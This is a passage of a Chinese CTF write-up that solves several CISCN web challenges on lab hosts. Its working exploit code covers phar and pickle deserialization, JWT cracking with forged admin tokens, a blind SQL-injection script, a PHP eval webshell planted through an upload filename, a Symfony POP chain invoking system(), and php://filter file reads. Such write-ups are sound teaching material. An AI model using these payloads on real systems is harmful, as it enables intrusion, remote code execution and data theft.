<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename=<span class="string">"/flag.txt"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=<span class="keyword">array</span>($file);</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = <span class="keyword">new</span> User();</span><br><span class="line">$test-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'s.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a __HALT_COMPILER();"</span>);</span><br><span class="line">$phar-&gt;setMetadata($test);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'a'</span>,<span class="string">'a'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>

<p>将生成的s.phar改后缀为gif，上传，在删除s.gif时，抓包修改filename为<code>phar://s.gif</code></p>
<p><img src="/pic/74.png" alt=""></p>
<h2 id="华北赛区-Day1-Web2-ikun"><a href="#华北赛区-Day1-Web2-ikun" class="headerlink" title="华北赛区 Day1 Web2 ikun"></a>华北赛区 Day1 Web2 ikun</h2><p>打开题目有注册界面，先注册，登入</p>
<p>回到首页发现要买到LV6</p>
<p><img src="/pic/75.png" alt=""></p>
<p>在第181页找到了LV6点击购买</p>
<p><img src="/pic/76.png" alt=""></p>
<p>抓包发现有一个价格，有一个折扣</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/shopcar</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 106</span><br><span class="line"><span class="attribute">Origin</span>: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn/shopcar</span><br><span class="line"><span class="attribute">Cookie</span>: _xsrf=2|578fed8a|97f2448968d2a525b9b0490c07c3413f|1581661272; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78; commodity_id="2|1:0|10:1581662353|12:commodity_id|8:MTYyNA==|e3649aa3872d333d61bd8b14770c0c7ca9c0539d9263777c505ebe2ac3e7e15f"</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">_xsrf=2%7C83e3992c%7C439e302fbcbed1836ddc3daad3af3599%7C1581661272&amp;id=1624&amp;price=1145141919.0&amp;discount=0.8</span><br></pre></td></tr></table></figure>

<p>把价格改成很小发现出错，把折扣改小出现新界面提示需要admin才能访问</p>
<p><img src="/pic/77.png" alt=""></p>
<p><img src="/pic/78.png" alt=""></p>
<p>查看cookie，其中有一个JWT、_xsrf、commodity_id</p>
<p><a href="https://blog.csdn.net/hekewangzi/article/details/72885670" target="_blank" rel="noopener">关于JWT</a>   去jwt.io解析一下</p>
<p><img src="/pic/79.png" alt=""></p>
<p>使用的是HS256（HMAC SHA256对称加密）算法</p>
<p>使用c-jwt-cracker破解成功，密钥为1Kun</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/tools/c-jwt-cracker<span class="comment"># ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78</span></span><br><span class="line">Secret is <span class="string">"1Kun"</span></span><br></pre></td></tr></table></figure>

<p>回到<a href="https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun" target="_blank" rel="noopener">https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun</a></p>
<p><img src="/pic/80.png" alt="">  </p>
<p>然后修改cookie为<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code></p>
<p><img src="/pic/81.png" alt="">  </p>
<p>点击页面无反应，查看源码，发现了一个WWW.ZIP</p>
<p><img src="/pic/82.png" alt="">  </p>
<p>打开发现是tornado的框架</p>
<p>既然PHP有序列化漏洞，python也有，通过pickle模块实现 [参考文章]（<a href="https://www.jianshu.com/p/8fd3de5b4843）" target="_blank" rel="noopener">https://www.jianshu.com/p/8fd3de5b4843）</a></p>
<p>在sshop/view/Admin.py中含有序列化漏洞</p>
<p><img src="/pic/83.png" alt=""></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span><span class="params">(BaseHandler)</span>:</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))     </span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>编写exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> eval,(<span class="string">"open('/flag.txt','r').read()"</span>,)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    a = test()</span><br><span class="line">    payload = pickle.dumps(a)</span><br><span class="line">    print(urllib.quote(payload))  <span class="comment">#c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span></span><br></pre></td></tr></table></figure>

<p>在/b1g_m4mber界面点击一键成为大会员</p>
<p>在BP中修改post中的become数据</p>
<p><img src="/pic/84.png" alt=""></p>
<h2 id="总决赛-Day2-Web1-Easyweb"><a href="#总决赛-Day2-Web1-Easyweb" class="headerlink" title="总决赛 Day2 Web1 Easyweb"></a>总决赛 Day2 Web1 Easyweb</h2><p>打开又是一个登入界面，访问robots.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: *.php.bak</span><br></pre></td></tr></table></figure>

<p>在登入界面登入后有一个get /image.php?id=1请求</p>
<p>访问/image.php.bak得到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path); </span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>addslashes() 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（<em>‘</em>）、双引号（<em>“</em>）、反斜线（<em>\</em>）与 NUL（<strong><code>NULL</code></strong> 字符）。</p>
<p>因为单引号被过滤，刚好又有两个变量，id后面的单引号被转义后，path后面输入的内容就会被当作语句执行，然后把path后面的单引号注释掉就不会报错了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39;$path&#39;&quot;    -&gt;</span><br><span class="line">&quot;select * from images where id&#x3D;&#39; or path&#x3D;&#39; $path &quot;</span><br></pre></td></tr></table></figure>

<p>编写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2/14/2020 8:39 PM</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2hex</span><span class="params">(strs)</span>:</span></span><br><span class="line">    hexs=<span class="string">'0x'</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(strs)):</span><br><span class="line">        hexs+=hex(ord(strs[x]))[<span class="number">2</span>:]</span><br><span class="line">    print(hexs)</span><br><span class="line">    <span class="keyword">return</span> hexs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(payload)</span>:</span></span><br><span class="line">    url = <span class="string">'http://48e2e973-9423-4d4e-b6ff-0e79cf4c1a5f.node3.buuoj.cn/image.php?id=\\0&amp;path=or id=('</span>+payload+<span class="string">')--+'</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">999</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    x=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> x &lt;= len :</span><br><span class="line">        error = <span class="number">0</span></span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"if(ascii(substr((%s),%d,1))&gt;%d,1,0)"</span> % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            res = get(payload)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">404</span> <span class="keyword">or</span> res.status_code == <span class="number">429</span>:</span><br><span class="line">                x=x<span class="number">-1</span></span><br><span class="line">                error = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            html=res.text</span><br><span class="line">            <span class="comment"># print(html,'*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'F'</span>  <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> mid == <span class="number">0</span> :</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> error == <span class="number">0</span> :</span><br><span class="line">            result += chr(mid)</span><br><span class="line">            print(result)</span><br><span class="line">        x=x+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tables</span><span class="params">(db)</span>:</span></span><br><span class="line">    db=str2hex(db)</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(table_name))from(information_schema.tables)where(table_schema='</span>+db+<span class="string">')'</span></span><br><span class="line">    tables=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">(table)</span>:</span></span><br><span class="line">    table = str2hex(table)</span><br><span class="line">    s_payload = <span class="string">'select(group_concat(column_name))from(information_schema.columns)where(table_name='</span>+table+<span class="string">')'</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">(columns,table)</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select(group_concat('</span>+columns+<span class="string">'))from('</span>+table+<span class="string">')'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_database() #ciscnfinal</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># get_tables('ciscnfinal') #images,users</span></span><br><span class="line"></span><br><span class="line">get_data(<span class="string">'password'</span>,<span class="string">'users'</span>) <span class="comment">#1f97eef3ea37a28db040</span></span><br></pre></td></tr></table></figure>

<p>其实直接猜表为users和栏password就好了   </p>
<p>拿到密码然后登入，登入之后是一个文件上传，随便上传一个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">I logged the file name you uploaded to logs&#x2F;upload.054981d8766f246f4da3af656bbf6fe9.log.php.</span><br></pre></td></tr></table></figure>

<p>修改文件名为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&lt;?&#x3D; eval($_POST[&#39;cmd&#39;]) ?&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>短标签<? ?>需要php.ini开启short_open_tag = On，但<?= ?>不受该条控制。</p>
<p>采用js写法的标记发现不起作用。</p>
<p>菜刀连接，flag在根目录，打开即可</p>
<p><img src="/pic/85.png" alt=""></p>
<h2 id="总决赛-Day1-Web4-Laravel1"><a href="#总决赛-Day1-Web4-Laravel1" class="headerlink" title="总决赛 Day1 Web4 Laravel1"></a>总决赛 Day1 Web4 Laravel1</h2><p>打开题目，有一段代码，还给出了源码地址，下载整个源码，进行代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//backup in source.tar.gz</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(\Illuminate\Http\Request $request)</span></span>&#123;</span><br><span class="line">        $payload=$request-&gt;input(<span class="string">"payload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($payload))&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            @unserialize($payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接给出了反序列化函数，接下来就是寻找POP链</p>
<p>其中包含命名空间 <a href="https://www.runoob.com/php/php-namespace.html" target="_blank" rel="noopener">关于命名空间</a></p>
<p>先搜索__destruct，发现很多里面都是空的</p>
<p><img src="/pic/86.png" alt=""></p>
<p>后面在<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php</code>找到一个</p>
<p><img src="/pic/87.png" alt=""></p>
<p>查看<code>invalidateTags</code>方法的定义</p>
<p><img src="/pic/88.png" alt=""></p>
<p>其中有一个<code>saveDeferred</code>，全局搜索看看，找到了<code>vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php</code></p>
<p><img src="/pic/89.png" alt=""></p>
<p>接着看<code>dosave</code>，就在当前页面的下面</p>
<p><img src="/pic/90.png" alt=""></p>
<p>此处存在动态调用可以调用到<code>system()</code></p>
<p><img src="/pic/91.png" alt=""></p>
<p><code>$this-&gt;setInnerItem</code>可控，<code>$innerItem</code>是我们传入的<code>$item</code>类中的<code>$innerItem</code>属性</p>
<p>这里可以看到有 <strong>$item[“\0*\0expiry”]</strong>、<strong>$item[“\0*\0poolHash”]</strong> 这种写法，数组键名带有 <strong>\0*\0</strong> 。这实际上是类中，修饰符为 <strong>protected</strong> 的属性，在类强转成数组之后的结果</p>
<p><img src="/pic/92.png" alt=""></p>
<p>构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $innerItem = <span class="string">'cat /flag'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $setInnerItem = <span class="string">'system'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $deferred = [];</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> ProxyAdapter();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line">$a -&gt; deferred = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="keyword">new</span> \Symfony\Component\Cache\CacheItem);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?payload&#x3D;O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="/pic/93.png" alt=""></p>
<h2 id="华北赛区-Day1-Web5-CyberPunk"><a href="#华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="华北赛区 Day1 Web5 CyberPunk"></a>华北赛区 Day1 Web5 CyberPunk</h2><p>是一个登入页面，查看网页源码，在最后发现了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--?file&#x3D;?--&gt;</span><br></pre></td></tr></table></figure>

<p>可能是文件下载或者是文件包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#x2F;index.php?file&#x3D;index.php   返回数据为空</span><br></pre></td></tr></table></figure>

<p>尝试使用伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure>

<p>读取成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;index.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;open_basedir&#39;, &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; $file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$file &#x3D; (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">    if (preg_match(&quot;&#x2F;phar|zip|bzip2|zlib|data|input|%00&#x2F;i&quot;,$file)) &#123;</span><br><span class="line">        echo(&#39;no way!&#39;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    @include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;index&lt;&#x2F;title&gt;</span><br><span class="line">&lt;base href&#x3D;&quot;.&#x2F;&quot;&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;custom-animations.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;link href&#x3D;&quot;assets&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;h&quot;&gt;</span><br><span class="line">	&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;h2&gt;2077发售了,不来份实体典藏版吗?&lt;&#x2F;h2&gt;</span><br><span class="line">        &lt;img class&#x3D;&quot;logo&quot; src&#x3D;&quot;.&#x2F;assets&#x2F;img&#x2F;logo-en.png&quot;&gt;&lt;!--LOGOLOGOLOGOLOGO--&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;col-md-8 col-md-offset-2 centered&quot;&gt;</span><br><span class="line">                &lt;h3&gt;提交订单&lt;&#x2F;h3&gt;</span><br><span class="line">                &lt;form role&#x3D;&quot;form&quot; action&#x3D;&quot;.&#x2F;confirm.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;application&#x2F;x-www-urlencoded&quot;&gt;</span><br><span class="line">                    &lt;p&gt;</span><br><span class="line">                    &lt;h3&gt;姓名:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;user_name&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;电话:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;phone&quot;&gt;</span><br><span class="line">                    &lt;h3&gt;地址:&lt;&#x2F;h3&gt;</span><br><span class="line">                    &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;subscribe-input&quot; name&#x3D;&quot;address&quot;&gt;</span><br><span class="line">                    &lt;&#x2F;p&gt;</span><br><span class="line">                    &lt;button class&#x3D;&#39;btn btn-lg  btn-sub btn-white&#39; type&#x3D;&quot;submit&quot;&gt;我正是送钱之人&lt;&#x2F;button&gt;</span><br><span class="line">                &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&quot;f&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">            &lt;h2 class&#x3D;&quot;mb&quot;&gt;订单管理&lt;&#x2F;h2&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;search.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要查订单&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;change.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我要修改收货地址&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">            &lt;a href&#x3D;&quot;.&#x2F;delete.php&quot;&gt;</span><br><span class="line">                &lt;button class&#x3D;&quot;btn btn-lg btn-register btn-white&quot; &gt;我不想要了&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;a&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src&#x3D;&quot;assets&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script 